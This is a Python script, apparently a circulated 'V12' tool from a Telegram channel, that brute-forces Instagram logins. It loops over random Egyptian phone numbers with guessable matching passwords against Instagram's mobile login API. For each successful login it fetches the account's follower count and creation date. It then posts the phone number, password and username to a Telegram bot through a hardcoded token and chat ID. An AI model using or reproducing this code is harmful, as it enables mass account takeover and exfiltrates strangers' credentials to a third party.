# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
# = = = = = = = = = = = = 
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
Z = '\033[1;31m' #احمر
A = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
X = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
'\033[1;34m'
'\033[1;34m'
# = = = = = = = = = = = =

try:
    import os
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
   


    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)
            
logo ='''
'''+BWhite+''' <'''+BBlue+''' اداه نسخه V12 تخمط اذكر مصدر.'''+BWhite+''' >                                 
'''+BWhite+'''⁂ '''+BBlue+'''-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --'''+BWhite+''' ⁂ 
'''+BWhite+'''['''+BPurple+'''⌯'''+BWhite+''']'''+BBlue+''' Coder'''+BWhite+''':'''+BPurple+''' Lucifer
'''+BWhite+'''['''+BPurple+'''⌯'''+BWhite+''']'''+BBlue+''' Channel'''+BWhite+''':'''+BPurple+''' قناتي التليكيرام @cccxxq
'''+BWhite+'''['''+BPurple+'''⌯'''+BWhite+''']'''+BBlue+''' Telegram Devlopper'''+BWhite+''':'''+BPurple+''' حسابي الرسمي @UUUD7
'''+BWhite+'''⁂ '''+BBlue+'''-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --'''+BWhite+''' ⁂ '''
print(logo)
print(' ')
print(BWhite+'== == == == == == == == == == == == == == == == == == == == == == == ==')
ID = ("831161538") 
tok = ("1986194846:AAGIWOtiLEeUFdcvtAluvrP-fq-aqB7uoMQ") 


def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']

        lucifer = f" 𝘕𝘌𝘞 𝘈𝘊𝘊𝘖𝘜𝘕𝘛 ︎\n•--------------------------------•  \n [+] 𝗘𝗠𝗔𝗜𝗟 : {username}\n [+] 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : {password}\n [+] 𝗨𝗦𝗘𝗥 : {userQ}\n [+] 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗦 : {followes}\n [+] 𝗗𝗔𝗧𝗘 : {dat}\n •--------------------------------•\n  𝗖𝗛 : @PHP505 "
        
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {lucifer} \n"
        i = requests.post(tlg)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
sleep(1)
sleep(0.1)
user = '0987654321'
while True:
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2012' + us
        password = '012'+ us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Z1+f"\r                 \n [=] Hit : {zz} \n [=] Bad : {aa} \n [=] Scure :  \n [=] Block : \n [=] User : {username} \n [=] Pass : {password} ",end='')
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print (Z1+"⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯")
            print (X+" نسخه V12")
            print (X+" 𝗖𝗛 : @PHP505")
            print (Z1+"⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯")
            print(C+f"\r                 \n {F}[=] Hit : {zz} \n {Z1}[=] Bad : {aa} {S}\n{A} [=] Scure :  \n {X}[=] Block : \n {C}[=] User : {username} \n{Z} [=] Pass : {password} ",end='')
            aa += 1